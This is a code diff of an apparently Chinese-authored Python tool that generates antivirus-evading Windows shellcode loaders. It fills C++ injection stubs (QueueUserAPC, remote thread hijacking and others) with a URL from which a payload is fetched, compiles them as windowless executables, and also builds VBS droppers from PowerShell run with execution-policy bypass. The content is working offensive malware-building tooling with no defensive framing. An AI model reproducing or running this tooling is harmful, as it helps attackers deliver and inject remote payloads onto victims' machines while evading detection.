@@ -9,7 +9,7 @@ from tkinter import *
 from tkinter import filedialog
 import Resource.StringPainting
 from colorama import Fore
-import Stub.Encryptor
+
 
 
 
@@ -31,13 +31,13 @@ Cpp_injection_mode_options = DAZZLINGCOLORS.OKPINK + """
                                                       
 Injection Mode:
 +----------+----+--------------------------+--------+--- +           
-|1.QueueUserAPC                                          |   
-*                                                        *   
-|2.RemoteThreadContext                                   |    
-*                                                        *   
-|3.RemoteThreadSuspended                                 |
+|1.QueueUserAPC (Syscall multi-stage loading)            |
 *                                                        *
-|4.CurrentThread                                         |   
+|2.RemoteThreadContext (Syscall multi-stage loading)     |
+*                                                        *     
+|3.RemoteThreadSuspended (Syscall multi-stage loading)   |
+*                                                        *
+|4.CurrentThread (Syscall multi-stage loading)           |   
 +----------+----+--------------------------+--------+----+\n
 """
 
@@ -133,75 +133,54 @@ def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspend
     while True:
         Options = input(INOTGREEN)
         if Options == "1":  # 1.免杀加载器
-            while True:
-                # print()
-                print(Resource.StringPainting.DynamicPainting.DynaminString() + DAZZLINGCOLORS.OKPINK + 
-                      "\nPlease select shellcode loader:\n"
-                      "+----------+----+--------------------------+--------+ \n"
-                      "|                                                   | \n"
-                      "|1.C/C++ Syscall Multi-stage loading                | \n"
-                      "|                                                   | \n"
-                      "+----------+----+--------------------------+--------+ \n")
-                                
-                Bypass_choice = input(INOTGREEN)
-                if Bypass_choice == "back" or Bypass_choice == "BACK":
-                    print(Option_stub)
-                    break
-                if Bypass_choice == "1":  # C/C++系统调用加载器
-                    print(Cpp_injection_mode_options)
-                    Inject_Module = input(DAZZLINGCOLORS.OKGREEN + "Please select process injection mode:\n"+INOTGREEN)
-                    
-                    print("\n")
-                    #file = input(DAZZLINGCOLORS.OKGREEN + "请输入raw格式的文件:\n" +INOTGREEN)
-                    
-                 
-                    URL = input(DAZZLINGCOLORS.OKGREEN +"\n(enter the URL of bin)\n"+INOTGREEN)
-                    
-                    outfile = "%USERPROFILE%\Desktop\\Green.exe"
-                    try:
-                        if os.path.exists(outfile):
-                            os.system("""del "{0}"\n""".format(outfile))
-                        
-                       
-                        elif Inject_Module in ["1", "QueueUserAPC", "queueUserapc"]:
-                            APC_Injection = APC_Injection.replace("URLREPLACE",URL)
-                            stub = open("Stub\\stub.cpp", "w")
-                            stub.write(APC_Injection)
-                            stub.close()
-                            os.system("x86_64-w64-mingw32-g++ Stub\\stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows")
-                        elif Inject_Module in ["2", "RemoteThreadContext", "remotethreadcontext"]:
-                           RemoteThreadContext = RemoteThreadContext.replace("URLREPLACE",URL)
-                           stub = open("Stub\\stub.cpp", "w")
-                           stub.write(RemoteThreadContext)
-                           stub.close()
-                        elif Inject_Module in ["3", "RemoteThreadSuspended", "remoteThreadsuspended"]:
-                           RemoteThreadSuspended = RemoteThreadSuspended.replace("URLREPLACE",URL)
-                           stub = open("Stub\\stub.cpp", "w")
-                           stub.write(RemoteThreadSuspended)
-                           stub.close()
-                        elif Inject_Module in ["4", "CurrentThread", "currentthread"]:
-                            CurrentThread_stub = CurrentThread.replace("URLREPLACE",URL)
-                            stub = open("Stub\\stub.cpp", "w")
-                            stub.write(CurrentThread_stub)
-                            stub.close()
-                            
-                        os.system("x86_64-w64-mingw32-g++ Stub\\stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows")
-                        if os.path.exists("a.exe"):
-                            print(randomcolor()+"[+] Generated successfully!")
-                        else:{
-                            print(randomcolor()+"[!] Generated failed")
-                        }
-                        os.system("del Stub\\stub.cpp")
-                        
-                        break
-                    except:
-                        continue
+           print(Resource.StringPainting.DynamicPainting.DynaminString() + DAZZLINGCOLORS.OKPINK)
+           print(Cpp_injection_mode_options)
+           Inject_Module = input(DAZZLINGCOLORS.OKGREEN + "Please select process injection mode:\n"+INOTGREEN)
+           
+           print("\n")
+           URL = input(DAZZLINGCOLORS.OKGREEN +"\n <URL of bin>:\n")
+           
+           outfile = "a.exe"
+           try:
+               if os.path.exists(outfile):
+                   os.system("""del "{0}"\n""".format(outfile))
+               
+              
+               elif Inject_Module in ["1", "QueueUserAPC", "queueUserapc"]:
+                   APC_Injection = APC_Injection.replace("URLREPLACE",URL)
+                   stub = open("Stub\\stub.cpp", "w")
+                   stub.write(APC_Injection)
+                   stub.close()
+                   os.system("x86_64-w64-mingw32-g++ Stub\\stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows")
+               elif Inject_Module in ["2", "RemoteThreadContext", "remotethreadcontext"]:
+                  RemoteThreadContext = RemoteThreadContext.replace("URLREPLACE",URL)
+                  stub = open("Stub\\stub.cpp", "w")
+                  stub.write(RemoteThreadContext)
+                  stub.close()
+               elif Inject_Module in ["3", "RemoteThreadSuspended", "remoteThreadsuspended"]:
+                  RemoteThreadSuspended = RemoteThreadSuspended.replace("URLREPLACE",URL)
+                  stub = open("Stub\\stub.cpp", "w")
+                  stub.write(RemoteThreadSuspended)
+                  stub.close()
+               elif Inject_Module in ["4", "CurrentThread", "currentthread"]:
+                   CurrentThread_stub = CurrentThread.replace("URLREPLACE",URL)
+                   stub = open("Stub\\stub.cpp", "w")
+                   stub.write(CurrentThread_stub)
+                   stub.close()
+                   
+               os.system("x86_64-w64-mingw32-g++ Stub\\stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows")
+               if os.path.exists("a.exe"):
+                   print(randomcolor()+"[+] Generated successfully!")
+               else:{
+                   print(randomcolor()+"[!] Generated failed")
+               }
+               os.system("del Stub\\stub.cpp")
+               
+               
+           except:
+               continue
+    
                 
-
-                if Bypass_choice in other_commands.back_command:
-                    print(Option_stub)
-                    
-                    break
                         
         
         if Options == "2":  # 2.文件格式转换
@@ -210,27 +189,21 @@ def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspend
                       "+----------+----+--------------------------+\n"
                       "| 1.ps1_to_vbs(stage)                      |\n"
                       "*                                          *\n"
-                      "| 3.C#_to_ps1                             |\n"
-                      "*                                          *\n"
-                      "| 5.ps1_to_vbs(stageless)                  |\n"
+                      "| 2.C#_to_ps1                              |\n"
                       "+----------+----+--------------------------+\n")
                                 
                 formatopions = input(DAZZLINGCOLORS.OKGREEN + INOTGREEN)
                 if formatopions not in other_commands.sheshell_commandl:
                     other_commands.Shell_Command(formatopions)
                 if formatopions == "1":  #1.ps1_to_vbs(stage) 
-                    url = input(DAZZLINGCOLORS.OKGREEN +"+----------+----+-------------+------------+\n""Input URL:\n\n" + INOTGREEN)
-                    PowerShell_stub = PowerShell_stub.replace("GREEN", url)
-                    # print(PowerShell_stub)
-                    #PowerShell_stubEncryption = base64.b64encode(PowerShell_stub.encode('utf-8')).decode("utf-8")
-                    #stub = stub.replace("REPLACED", PowerShell_stubEncryption)
+                    url = input(DAZZLINGCOLORS.OKGREEN +"+----------+----+-------------+------------+\n\n""ps1 of URL:")
+                    powershell_to_vbs = powershell_to_vbs.replace("URLREPLACE", url)
+  
                     print(DAZZLINGCOLORS.OKGREEN + "[+] Enable verbose messages")
                     if os.path.exists("Green.vbs"):
                         os.system("del Green.vbs")
                         
-                    writefile = open("stubps1tovbs.ps1", "w")
-                    writefile.write(PowerShell_stub)
-                    writefile.close()
+   
                     Ps1ToVbs = open("Ps1ToVbs.ps1", "w")
                     Ps1ToVbs.write(powershell_to_vbs)
                     Ps1ToVbs.close()
@@ -238,33 +211,19 @@ def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspend
                     print(DAZZLINGCOLORS.OKGREEN+ "[+] Save New stub to stubps1tovbs.ps1")
                     sleep(1)
                     outfile = GetDesktopPath() + "\\Green.vbs"
-                    os.system("powershell .\Ps1ToVbs.ps1")
+                    os.system("powershell -ep bypass .\Ps1ToVbs.ps1")
                     if os.path.exists("Green.vbs"):
-                        os.system("""copy Green.vbs "{0}" && del Green.vbs""".format(outfile))
-                    if os.path.exists(outfile) == True:
+                        
                         print(DAZZLINGCOLORS.OKPINK +"[!] Compile Successfully")
                     else:
                         print(DAZZLINGCOLORS.OKPINK +"[!] Compilation failed")
                     os.system("del Ps1ToVbs.ps1")
-                    os.system("del stubps1tovbs.ps1")
+                   
                     break
                 
                 
                 
-    
-                    print("请选择你的文件(Select your file)")
-                    FilePath = ReadFilePath("exe")
-                    print(FilePath)
-                    if os.path.exists("payload.bin"):
-                        os.system("del payload.bin")
-                    try:
-                        os.system("""Resource\donut.exe -f "{0}" -o payload.bin""".format(FilePath))
-                        exe2base64encode("payload.bin")
-                        #print(DAZZLINGCOLORS.OKRED + "[+]payload generated successfully--->payload.bin")
-                        break
-                    except:
-                        continue
-                if formatopions == "3":  #3.C#_to_ps1 
+                if formatopions == "2":  #3.C#_to_ps1 
                     print("请选择你的文件(Select your file)\n" + INOTGREEN)
                     FilePath = ReadFilePath("exe")
                     if os.path.exists("payload.bin"):
@@ -292,38 +251,7 @@ def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspend
                         
                     except:
                         continue
-                 
-   
-            
-                
-                if formatopions == "7":  #7.ps1_to_vbs(stageless)
-                    FilePath = ReadFilePath("ps1")
-                    with open(FilePath, 'r',encoding='utf-8') as files:
-                        text = files.read()
-                    print("[+] Enable verbose messages")
-                    if os.path.exists("Green.vbs"):
-                        os.system("del Green.vbs")    
-                    writefile = open("stubps1tovbs.ps1", "w")
-                    writefile.write(text)
-                    writefile.close()    
-                    
-                    Ps1ToVbs = open("Ps1ToVbs.ps1", "w")
-                    Ps1ToVbs.write(powershell_to_vbs)
-                    Ps1ToVbs.close()
-                    sleep(1)
-                    print("[+] Save New stub to stubps1tovbs.ps1")
-                    sleep(1)
-                    os.system("powershell .\Ps1ToVbs.ps1")
-                    if os.path.exists("Green.vbs"):
-                        os.system("""copy Green.vbs "{0}" && del Green.vbs &&del stubps1tovbs.ps1&& del Ps1ToVbs.ps1""".format(outfile))
-                    if os.path.exists(outfile) == True:
-                        print(DAZZLINGCOLORS.OKPINK +"[!] Compile Successfully")
-                    else:
-                        print(DAZZLINGCOLORS.OKPINK +"[!] Compilation failed")
-                    break
-                    
-                        
-                    
+                  
                     
                 if formatopions == "back" or formatopions == "BACK" or formatopions == None:
                     print(Option_stub)
@@ -338,8 +266,6 @@ def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspend
                     print(DAZZLINGCOLORS.OKGREEN + "Please select the file in raw format:\n<INETGREEN>:")
                     filepath = ReadFilePath('bin')
                     print(filepath)
-                    
-                    
                     print("\n")
                     print(DAZZLINGCOLORS.OKPINK + 
                         "+----------+----+--------------------------+--------+\n"
